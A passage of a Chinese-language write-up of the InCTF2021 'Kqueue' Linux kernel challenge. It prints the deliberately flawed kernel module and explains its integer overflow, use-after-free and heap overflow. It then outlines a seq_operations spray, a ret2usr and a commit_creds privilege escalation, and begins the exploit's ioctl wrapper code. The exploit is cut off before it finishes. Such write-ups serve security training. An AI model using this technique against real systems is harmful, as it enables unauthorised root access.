        current_entry<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data_size<span class="token punctuation">,</span>GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/* Increment current_entry by size of queue_entry */</span>
        current_entry <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue_entry<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">16</span><span class="token punctuation">;</span>

        <span class="token comment">/* Populate next pointer of the previous entry */</span>
        prev_entry<span class="token operator">-></span>next <span class="token operator">=</span> current_entry<span class="token punctuation">;</span>
        prev_entry <span class="token operator">=</span> prev_entry<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/* Find an appropriate slot in kqueues */</span>
    <span class="token class-name">uint32_t</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>MAX_QUEUES<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>kqueues<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span>MAX_QUEUES<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] No kqueue slot left"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Assign the newly created kqueue to the kqueues */</span>
    kqueues<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">;</span>
    queueCount<span class="token operator">++</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>create 分配队列，queue 的 data 字段和每个 entry 的 data 字段，分配 data_size 大小的内存，所有entry 结构紧跟在 queue 后面，entry 之间还通过 next 指针链接起来，queue 指针存放到全局 kqueues 变量数组里，queue 的情况大致如下：</p>
<pre class="line-numbers language-none"><code class="language-none">queue(size &#x3D; sizeof(queue_entry) * (request.max_entries+1) + sizeof(queue)):
	data_size
    queue_size
    max_entries
    idx
    data
    struct queue_entry[max_entries];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中的 <code>__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space)</code> 的作用是 <code>space = sizeof(queue_entry) * (request.max_entries+1)</code>，并且乘法溢出的时候返回 true，后面的 <code>__builtin_saddll_overflow</code> 就是加法溢出检查了</p>
<p>溢出检查存在一个问题，就是 <code>(request.max_entries+1)</code> 这里本身没有做溢出检查，使 <code>max_entries</code> 为 0xffffffff，那么加 1 溢出为0，最后计算出来 <code>queue_size = sizeof(queue)</code> 就不对了</p>
<p>然后还有一个应该是出题人写错的地方，就是这个 <code>err</code> 是个函数：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">err</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_ALERT <span class="token string">"%s\n"</span><span class="token punctuation">,</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>所有的检查失败都调用这个函数，但是<strong>这个函数并不会影响后面的流程，那么所有的参数检查都是无效的</strong>，因为这个问题，后面利用的时候比官方 wp 还要简单，应该是非预期了，如果 <code>err</code> 写成宏函数就没有问题了</p>
<p>delete 操作只是把队列删掉了，指针也置 NULL 了，不过还有槽点，指针 free 后还要改写其指向内容，这会破坏堆管理吧（应该又是写错了）：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">long</span> <span class="token function">delete_kqueue</span><span class="token punctuation">(</span><span class="token class-name">request_t</span> request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">/* Check for out of bounds requests */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>queue_idx<span class="token operator">></span>MAX_QUEUES<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Check for existence of the request kqueue */</span>
    queue <span class="token operator">*</span>queue <span class="token operator">=</span> kqueues<span class="token punctuation">[</span>request<span class="token punctuation">.</span>queue_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Requested kqueue does not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">kfree</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>queue<span class="token operator">-></span>queue_size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// UAF</span>
    kqueues<span class="token punctuation">[</span>request<span class="token punctuation">.</span>queue_idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>edit 操作:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">long</span> <span class="token function">edit_kqueue</span><span class="token punctuation">(</span><span class="token class-name">request_t</span> request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">/* Check the idx of the kqueue */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>queue_idx <span class="token operator">></span> MAX_QUEUES<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Invalid kqueue idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Check if the kqueue exists at that idx */</span>
    queue <span class="token operator">*</span>queue <span class="token operator">=</span> kqueues<span class="token punctuation">[</span>request<span class="token punctuation">.</span>queue_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] kqueue does not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Check the idx of the kqueue entry */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>entry_idx <span class="token operator">></span> queue<span class="token operator">-></span>max_entries<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Invalid kqueue entry_idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Get to the kqueue entry memory */</span>
    queue_entry <span class="token operator">*</span>kqueue_entry <span class="token operator">=</span> <span class="token punctuation">(</span>queue_entry <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>queue <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Check for the existence of the kqueue entry */</span>
    exists <span class="token operator">=</span> false<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>queue<span class="token operator">-></span>max_entries<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        
        <span class="token comment">/* If kqueue entry found , do the necessary */</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>kqueue_entry <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>data <span class="token operator">&amp;&amp;</span> queue<span class="token operator">-></span>data_size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>kqueue_entry<span class="token operator">-></span>idx <span class="token operator">==</span> request<span class="token punctuation">.</span>entry_idx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">validate</span><span class="token punctuation">(</span><span class="token function">memcpy</span><span class="token punctuation">(</span>kqueue_entry<span class="token operator">-></span>data<span class="token punctuation">,</span>request<span class="token punctuation">.</span>data<span class="token punctuation">,</span>queue<span class="token operator">-></span>data_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                exists <span class="token operator">=</span> true<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        kqueue_entry <span class="token operator">=</span> kqueue_entry<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/* What if the idx is 0, it means we have to update the main kqueue's data */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>entry_idx<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> kqueue_entry <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>data <span class="token operator">&amp;&amp;</span> queue<span class="token operator">-></span>data_size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token function">memcpy</span><span class="token punctuation">(</span>queue<span class="token operator">-></span>data<span class="token punctuation">,</span>request<span class="token punctuation">.</span>data<span class="token punctuation">,</span>queue<span class="token operator">-></span>data_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>exists<span class="token punctuation">)</span>
        <span class="token keyword">return</span> NOT_EXISTS<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>根据参数 queue_idx 选择队列，找到 entry_idx 对应的 entry 写入 data 指向的数据，需要注意的是 queue 结构体也有一个 data 字段，这个相当于 entry_idx 为 0 的 entry，可以算是头节点吧，没有什么漏洞点，但是这里也有个槽点，就是这个 request-&gt;data 可是用户地址空间的指针，要不是 SMAP 没开，<code>validate(memcpy(kqueue_entry-&gt;data,request.data,queue-&gt;data_size));</code> 就炸了</p>
<p>save 操作：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">long</span> <span class="token function">save_kqueue_entries</span><span class="token punctuation">(</span><span class="token class-name">request_t</span> request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

    <span class="token comment">/* Check for out of bounds queue_idx requests */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>queue_idx <span class="token operator">></span> MAX_QUEUES<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Invalid kqueue idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Check if queue is already saved or not */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>isSaved<span class="token punctuation">[</span>request<span class="token punctuation">.</span>queue_idx<span class="token punctuation">]</span><span class="token operator">==</span>true<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Queue already saved"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    queue <span class="token operator">*</span>queue <span class="token operator">=</span> <span class="token function">validate</span><span class="token punctuation">(</span>kqueues<span class="token punctuation">[</span>request<span class="token punctuation">.</span>queue_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Check if number of requested entries exceed the existing entries */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>max_entries <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> request<span class="token punctuation">.</span>max_entries <span class="token operator">></span> queue<span class="token operator">-></span>max_entries<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Invalid entry count"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Allocate memory for the kqueue to be saved */</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>new_queue <span class="token operator">=</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kzalloc</span><span class="token punctuation">(</span>queue<span class="token operator">-></span>queue_size<span class="token punctuation">,</span>GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Each saved entry can have its own size */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data_size <span class="token operator">></span> queue<span class="token operator">-></span>queue_size<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Entry size limit exceed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Copy main's queue's data */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>queue<span class="token operator">-></span>data <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span>
        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token function">memcpy</span><span class="token punctuation">(</span>new_queue<span class="token punctuation">,</span>queue<span class="token operator">-></span>data<span class="token punctuation">,</span>request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Internal error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    new_queue <span class="token operator">+=</span> queue<span class="token operator">-></span>data_size<span class="token punctuation">;</span>

    <span class="token comment">/* Get to the entries of the kqueue */</span>
    queue_entry <span class="token operator">*</span>kqueue_entry <span class="token operator">=</span> <span class="token punctuation">(</span>queue_entry <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>queue <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* copy all possible kqueue entries */</span>
    <span class="token class-name">uint32_t</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>request<span class="token punctuation">.</span>max_entries<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>kqueue_entry <span class="token operator">||</span> <span class="token operator">!</span>kqueue_entry<span class="token operator">-></span>data<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>kqueue_entry<span class="token operator">-></span>data <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span>
            <span class="token function">validate</span><span class="token punctuation">(</span><span class="token function">memcpy</span><span class="token punctuation">(</span>new_queue<span class="token punctuation">,</span>kqueue_entry<span class="token operator">-></span>data<span class="token punctuation">,</span>request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Internal error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        kqueue_entry <span class="token operator">=</span> kqueue_entry<span class="token operator">-></span>next<span class="token punctuation">;</span>
        new_queue <span class="token operator">+=</span> queue<span class="token operator">-></span>data_size<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/* Mark the queue as saved */</span>
    isSaved<span class="token punctuation">[</span>request<span class="token punctuation">.</span>queue_idx<span class="token punctuation">]</span> <span class="token operator">=</span> true<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>save 操作把指定数量的 data 存放到新分配的大小为 <code>queue_size</code> 的内存里，然后这里有个漏洞点：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token comment">/* Each saved entry can have its own size */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data_size <span class="token operator">></span> queue<span class="token operator">-></span>queue_size<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Entry size limit exceed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>queue<span class="token operator">-></span>data <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span>
        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token function">memcpy</span><span class="token punctuation">(</span>new_queue<span class="token punctuation">,</span>queue<span class="token operator">-></span>data<span class="token punctuation">,</span>request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>request<span class="token punctuation">.</span>max_entries<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>kqueue_entry <span class="token operator">||</span> <span class="token operator">!</span>kqueue_entry<span class="token operator">-></span>data<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>kqueue_entry<span class="token operator">-></span>data <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span>
            <span class="token function">validate</span><span class="token punctuation">(</span><span class="token function">memcpy</span><span class="token punctuation">(</span>new_queue<span class="token punctuation">,</span>kqueue_entry<span class="token operator">-></span>data<span class="token punctuation">,</span>request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Internal error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        kqueue_entry <span class="token operator">=</span> kqueue_entry<span class="token operator">-></span>next<span class="token punctuation">;</span>
        new_queue <span class="token operator">+=</span> queue<span class="token operator">-></span>data_size<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所有的 memcpy 使用的长度都是用户传递过来的 <code>request.data_size</code>，而参数检查里面只检查了 <code>request.data_size</code> 是否超过 <code>queue-&gt;queue_size</code>， 理应是 <code>if(request.data_size &gt; queue-&gt;data_size)</code>，这就存在一个堆溢出了 （<del>虽然参数检查一点用没有</del>）</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>如果不考虑参数检查，利用方式非常简单，同时这也是 <a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9AInCTF2021-Kqueue"><strong>@arttnba3</strong></a> 师傅的做法</p>
<ol>
<li>create 操作，利用 <code>request.max_entries=0xffffffff</code> 溢出，创造一个只有 0x18 大小的 queue，并且忽略参数检查，data_size 比 queue_size 大，后面 save 才能溢出</li>
<li>堆喷射大量的 seq_operations，堆溢出后改写 seq_operations 的指针劫持程序执行流</li>
<li>劫持程序执行流，ret2usr，根据栈上面的数据泄露内核基址，执行 <code>commit_creds(prepare_kernel_cred(0));</code> 提权后返回用户态起 shell 即可</li>
</ol>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>


<span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">uint32_t</span> max_entries<span class="token punctuation">;</span>
    <span class="token class-name">uint16_t</span> data_size<span class="token punctuation">;</span>
    <span class="token class-name">uint16_t</span> entry_idx<span class="token punctuation">;</span>
    <span class="token class-name">uint16_t</span> queue_idx<span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token class-name">request_t</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> fd<span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">create_kqueue</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> max_entries<span class="token punctuation">,</span> <span class="token class-name">uint16_t</span> data_size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token class-name">request_t</span> req <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
		<span class="token punctuation">.</span>max_entries <span class="token operator">=</span> max_entries<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>data_size <span class="token operator">=</span> data_size<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xDEADC0DE</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">edit_kqueue</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> queue_idx<span class="token punctuation">,</span> <span class="token class-name">uint16_t</span> entry_idx<span class="token punctuation">,</span>  <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token class-name">request_t</span> req <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
		<span class="token punctuation">.</span>queue_idx <span class="token operator">=</span> queue_idx<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>entry_idx <span class="token operator">=</span> entry_idx<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xDAADEEEE</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">delete_kqueue</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> queue_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token class-name">request_t</span> req <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
		<span class="token punctuation">.</span>queue_idx  <span class="token operator">=</span> queue_idx<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xBADDCAFE</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">save_kqueue</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> queue_idx<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> max_entries<span class="token punctuation">,</span> <span class="token class-name">uint16_t</span> data_size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token class-name">request_t</span> req <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
		<span class="token punctuation">.</span>queue_idx  <span class="token operator">=</span> queue_idx<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>data_size <span class="token operator">=</span> data_size<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>max_entries <span class="token operator">=</span> max_entries<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xB105BABE</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span>
